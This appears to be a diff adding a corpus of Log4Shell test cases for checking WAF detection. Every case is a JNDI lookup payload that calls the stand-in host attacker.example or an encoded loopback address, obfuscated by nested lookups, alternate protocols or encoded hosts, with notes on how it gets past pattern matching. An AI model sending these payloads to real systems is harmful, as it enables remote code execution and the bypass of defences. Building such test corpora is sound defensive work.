@@ -1,0 +1,96 @@
+schema = 1
+# Log4j JNDI / lookup substitution evasion (CVE-2021-44228 and
+# follow-ons). The original `${jndi:ldap://attacker/x}` payload is
+# blocked by every modern WAF, but log4j's lookup substitution
+# happens RECURSIVELY — nested `${...}` expressions defeat
+# single-pass string match.
+
+[[case]]
+id = "nested_lower_jndi"
+class = "log4shell"
+payload = "${${lower:j}ndi:ldap://attacker.example/x}"
+description = "lower: lookup wrapping the literal 'j' — single-pass scan  sees `${${lower:j}ndi:...}` which doesn't contain `${jndi:`;  log4j recursively resolves to the dangerous form"
+
+[[case]]
+id = "nested_upper_jndi"
+class = "log4shell"
+payload = "${${upper:j}ndi:ldap://attacker.example/x}"
+description = "upper: lookup — same idea with the opposite case-fold"
+
+[[case]]
+id = "nested_lower_full_chain"
+class = "log4shell"
+payload = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/x}"
+description = "Every char of `jndi` wrapped — defeats any rule that  pattern-matches partial substrings"
+
+[[case]]
+id = "nested_env_default"
+class = "log4shell"
+payload = "${${env:DOES_NOT_EXIST:-j}ndi:ldap://attacker.example/x}"
+description = "env: lookup with default value — env var doesn't exist,  default 'j' substitutes; recursion yields jndi"
+
+[[case]]
+id = "nested_sys_default"
+class = "log4shell"
+payload = "${${sys:does.not.exist:-j}ndi:ldap://attacker.example/x}"
+description = "sys: lookup with default — system property doesn't exist,  default substitutes"
+
+[[case]]
+id = "nested_date_pattern_decoy"
+class = "log4shell"
+payload = "${${date:'j'}ndi:ldap://attacker.example/x}"
+description = "date: lookup with literal-quoted j — log4j's date format  accepts quoted literals; recursion yields jndi"
+
+# ── Protocol smuggling ──
+
+[[case]]
+id = "jndi_rmi_protocol"
+class = "log4shell"
+payload = "${jndi:rmi://attacker.example/x}"
+description = "RMI protocol instead of LDAP — works on vulnerable log4j;  WAFs that block only `jndi:ldap:` miss this"
+
+[[case]]
+id = "jndi_ldaps_https"
+class = "log4shell"
+payload = "${jndi:ldaps://attacker.example/x}"
+description = "ldaps: (LDAP-over-TLS) instead of plain ldap: —  semantically equivalent for the exploit, lexically distinct"
+
+[[case]]
+id = "jndi_corba_protocol"
+class = "log4shell"
+payload = "${jndi:corba://attacker.example/x}"
+description = "CORBA IIOP protocol — log4j's JNDI accepts iiop://; rare  in modern WAF blocklists"
+
+[[case]]
+id = "jndi_dns_oob_only"
+class = "log4shell"
+payload = "${jndi:dns://attacker.example}"
+description = "dns: protocol for OOB detection — generates a DNS lookup  to attacker-controlled nameserver; even when LDAP/RMI  are blocked, this leaks data via DNS"
+
+# ── Host-name obfuscation ──
+
+[[case]]
+id = "jndi_host_decimal_octet"
+class = "log4shell"
+payload = "${jndi:ldap://2130706433/x}"
+description = "Host as decimal-encoded IP (2130706433 = 127.0.0.1) —  Java's InetAddress parses; WAFs matching dotted-quad miss"
+
+[[case]]
+id = "jndi_host_hex_octet"
+class = "log4shell"
+payload = "${jndi:ldap://0x7f000001/x}"
+description = "Host as hex-encoded IP — Java accepts 0x-prefixed; WAFs  rarely normalise hex IPs"
+
+[[case]]
+id = "jndi_host_octal_octet"
+class = "log4shell"
+payload = "${jndi:ldap://0177.0.0.01/x}"
+description = "Host as octal-encoded IP — Java accepts leading-zero  octets; defeats dotted-quad WAF rules"
+
+# ── URL-format inside lookup ──
+
+[[case]]
+id = "jndi_with_basic_auth_decoy"
+class = "log4shell"
+payload = "${jndi:ldap://benign.example@attacker.example/x}"
+description = "Userinfo `benign.example@` followed by real attacker host  — WAFs hostlist-checking the literal prefix miss the  actual loaded host"
